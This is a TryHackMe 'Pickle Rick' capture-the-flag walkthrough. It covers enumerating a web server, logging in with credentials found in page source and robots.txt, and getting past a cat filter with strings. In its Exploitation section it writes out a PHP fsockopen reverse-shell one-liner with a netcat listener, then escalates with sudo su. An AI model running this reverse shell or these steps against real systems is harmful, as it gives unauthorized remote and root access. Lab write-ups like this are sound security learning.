# THM Pickle Rick Walkthrough  

## Intro  
This Rick and Morty themed room focuses on exploiting a web server to find 3 ingredients (flags) needed to turn Rick back into a human. These are the tools we will be using for this box.  
# Tools Used
- Nmap
- Gobuster
- Netcat
  
## Recon  
  
I started with an nmap scan to see what was exposed:  
`nmap -sC -sV -oN scan.txt <Machine IP>`  
  
The scan showed ports 80 and 22 open, so I focused on the web server first. Opening the site didn’t show anything interactive at first glance:  
![Website](images/website.png)

# Enumeration

Since there wasn’t much to work with on the surface, I checked the page source (CTRL + U), which ended up revealing a username hidden in a comment:    
![Source Code](images/Source.png)
  
I saved that for later and kept digging, but nothing else stood out on the main page. At that point, it made more sense to start enumerating directories to see if anything was hidden.  
`gobuster dir -u http://<Machine IP> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html,js -t 20`

After this scan was done I saw we found some new directories like `login.php` and `robots.txt` that were interesting. Going to robots.txt first I found a simple phrase: 
![robots](images/Robots.png)

It didn't look like anything at first but then I remembered I found `login.php` and a username earlier. So using the phrase I found as the password I attempted to login, and it worked! After logging in, I’m presented with a command panel. The first command I run is `ls` to see if any files pop up:
![command](images/command.png)

Seeing these files my first reaction is to run cat to read them but the command was blocked so that route is closed. The next thing I try is to run strings as this also allows us to read files without using cat. Using strings we are able to get the first ingredient we need. Using this same trick I'm able to also read the clue.txt: 
![clue](images/clue.png)
# Exploitation

The hint says to look around the file system, since navigation was restricted in the web shell, I decided to get a reverse shell for full system access:
`php -r '$sock=fsockopen("<YOUR IP>",<PORT>); exec("/bin/sh -i <&3 >&3 2>&3");'`

Before submitting that though i first setup a listener using netcat so it has something to connect back to: 
`nc -lnvp 4444`

Now I'm able to submit the php command to get a reverse shell:
![shell](images/Shell.png)

The command executed successfully. Now that I have a shell on the system, I’m able to move around and retrieve the remaining flags. Since the first ingredient was already obtained through the web panel, I focused on locating the remaining ones. My first thought is to check the `/home` directory as this is where a lot of the flags live and sure enough we find the second one:
![second](images/Second.png)
# Privilege Escalation

So that's 2 ingredients (flags) down only one more to go. The last flag usually lives in the `/root` directory so we have to find a way to escalate our privileges. The first i do this is to check `sudo -l` to see what the user i am is able to run: 
![privesc](images/Privesc.png)

For this result it looks like we are able to run anything we want to as sudo. With this, I used `sudo su` to switch to root and get the flag: 
![third](images/third.png)

And just like we got all 3 flags. 

# Conclusion
This was a fun and beginner-friendly box that covered the basics of enumeration, web exploitation, and privilege escalation. Starting from simple recon, it led into gaining a reverse shell and eventually escalating to root due to a misconfiguration. If I were to revisit it, I'd challenge myself to skip the reverse shell entirely and find a way to bypass the command filter directly in the web panel. 
